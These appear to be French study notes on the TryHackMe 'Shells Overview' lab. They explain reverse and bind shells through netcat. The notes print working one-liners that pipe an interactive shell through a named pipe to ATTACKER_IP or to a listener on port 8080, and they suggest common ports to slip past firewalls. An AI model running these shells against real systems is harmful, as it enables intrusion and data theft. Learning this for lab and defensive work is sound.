# [Shells Overview](https://tryhackme.com/room/shellsoverview)
## C'est quoi un shell ?

Un **shell** est un programme qui permettra à un utilisateur d'interagir avec l'OS (bash/zsh/fish...)
### Utilité
En hacking, un attaquant peut executer un **remote access control** pour executer des commande sur une machine à distance.  
Via un shell, on peut faire : 
* de l'**escalade de privilège** (passer de simple utilisateur à **root/admin**)
* de l'**exfiltration de donnée** (Volée des hash de mot de passe, code source, mot de passe ou tout type de donnée sensibles)
* de la **persistance** (**Backdoor** ou crée une autre session avec des droits root, _c'est utile pour revenir sur la machine même si la machine à supprimer notre moyen d'entrée initial ou a changer son mdp_) 
* du **pivoting** ce servir d'une permière machine compromises et s'en servir de **pivot** pour s'étendre sur le réseau interne de la cible (On hack un frigo connecter et finalement nous avons accès à la caméra du jardin )

## Reverse shell 
Un reverse shell est une technique qui permet à un attaquant d'avoir accès au shell d'une machine à distance.  
C'est une technique très puissante car elle fait en sorte que la machine se connecte elle même à l'attaquant et non l'inverse ce qui permet de contourner beaucoup de sécurité qui auraient pu être mis en place.
### Obtenir un reverse shell
Le plus simple est d'utiiliser l'outil **_netcat_**(`nc`) et de se mettre en **mode écoute** en attendant une connexion car ne l'oublions pas, c'est la cible qui se connecte à nôtre machine de manière **volontaire** ou plus souvent de manière **involontaire**.   

  
#### 1. Netcat en attendant une connexion (*Côté attaquant*) :
```bash
nc -lnvp [PORT]
```
* `nc` utilise l'outil netcat qui permet de se connecter à des services en **TCP/UDP** et aussi d'ouvrir des ports d'écoutes **TCP/UDP**
* `-l` (*listen*) met la commande en **mode écoute** et *non en mode connexion*, nous attendons une connexion
* `-n` (*no resolve dns*) ne va pas tenter de résoudre le DNS de la connexion pour éviter des soucis et gagner du temps
* `-v` (*verbose*) active le **mode verbose** et donc affichera d'avantage d'informations
* `-p [PORT]` (*port*) spécifie le port d'écoute que nous ouvrons en attendant une connexion. *Il est préférable d'utilisé des ports connus comme 80,443,22,21,23 pour que du point de vu du firewall cible, cela ressemble à une connexion lambda à un service connu. Cependant il ne faut pas oublier qu'ouvrir des ports inférieur à 1024 demande des droits root*

#### 2. Se connecter à l'attaquant (*Côté cible*) :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
* `rm -f /tmp/f` supprime tout ce qui se trouve dans le fichier temporaire f afin d'être sur de pouvoir utilisé cette emplacement sans problème. `-f` sert a ne pas affiché d'érreur dans le cas où le fichier **f** n'existe pas
* `mkfifo /tmp/f` crée un **tuyau nommé** (**FIFO**) sur le système. C'est lui qui permet de faire le pont et de créer un flux bidirectionnel entre le réseau et le shell.
* `cat /tmp/f` lit en continu ce qui arrive dans le tuyau nommé
* `| sh -i 2>&1` envoie le contenu lu par *cat* dans un **shell interactif** (`sh -i`) pour exécuter les commandes. Le `2>&1` sert à rediriger les erreurs pour qu'elles soient aussi renvoyées.
* `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` envoie le résultat du shell via Netcat vers l'attaquant, et la fin (`>/tmp/f`) renvoie les nouvelles commandes de l'attaquant directement dans le tuyau

*Il existe de nombreuses autres manières d'obtenir un reverse shell, ce [**site**](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) en référencis plusieurs*

## Bind shell
Un bind shell est comme un reverse shell sauf que ce n'est pas la cible qui se connecte à l'attaquant, mais la cible sera en écoute et l'attaquantnse connectera à elle.  
C'est une technique utilisé dans le cas où le firewall de la cible n'accepte pas de se connecter à un service externe mais autorise des connexions venant de l'extérieur ( configuration assez rare ).  
**Il est plus facile de se faire détécter en utilisant cette approche**
### Obtenir un bind shell
Pour obtenir un bind shell, nous allons lancer **_netcat_**(`nc`) sur la machine cible et se mettre en **mode écoute** en attandant que l'attaquant se connecte

#### 1. Netcat en attendant une connexion (*Côté cible*) :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
* `rm -f /tmp/f` supprime tout ce qui se trouve dans le fichier temporaire f afin d'être sur de pouvoir utilisé cette emplacement sans problème. `-f` sert a ne pas affiché d'érreur dans le cas où le fichier **f** n'existe pas
* `mkfifo /tmp/f` crée un **tuyau nommé** (**FIFO**) sur le système. C'est lui qui permet de faire le pont et de créer un flux bidirectionnel entre le réseau et le shell.
* `cat /tmp/f` lit en continu ce qui arrive dans le tuyau nommé
* `| bash -i 2>&1` envoie le contenu lu par *cat* dans un **shell interactif** (`bash -i`) pour exécuter les commandes. Le `2>&1` sert à rediriger les erreurs pour qu'elles soient aussi renvoyées.
* `| nc -l 0.0.0.0 8080` lance *Netcat* en **mode écoute** (`-l`) sur toute les interface (`0.0.0.0`) au port **8080**. C'est à ce port que l'attaquant devra se connecter. *Ne pas oublier qu'on a surement pas les droits root et donc tout les ports inférieurs à 1024 sont inutilisable sans sudo*
* `>/tmp/f` renvoie les nouvelles commandes de l'attaquant directement dans le tuyau
#### 2. Se connecter à la cible (*Côté attaquant*)
```bash
nc -nv IP_TARGET PORT_TARGET
```
* `nc` utilise l'outil netcat qui permet de se connecter à des services en **TCP/UDP** et aussi d'ouvrir des ports d'écoutes **TCP/UDP**
* `-n` (*no resolve dns*) ne va pas tenter de résoudre le DNS de la connexion pour éviter des soucis et gagner du temps
* `-v` (*verbose*) active le **mode verbose** et donc affichera d'avantage d'informations
* `IP_TARGET` se connecte à l'addresse IP de la cible
* `PORT_TARGET` se conncte au port d'écoute de la cible

### Autres outils d'écoutes
##### Rlwrap
```bash
rlwrap nc -lvnp PORT
```
`rlwrap nc` permet d'utiliser NetCat avec ces options habituelles mais d'en plus pouvoir utiliser les flèches pour naviguer dans les précédentes commandes
#### Ncat
```bash
ncat -lvnp 4444
```
Ncat est une version améliorée de Netcat, distribuée par le projet Nmap. Elle propose des fonctionnalités supplémentaires, telles que le chiffrement (SSL) avec `--ssl`
#### Socat
A complété
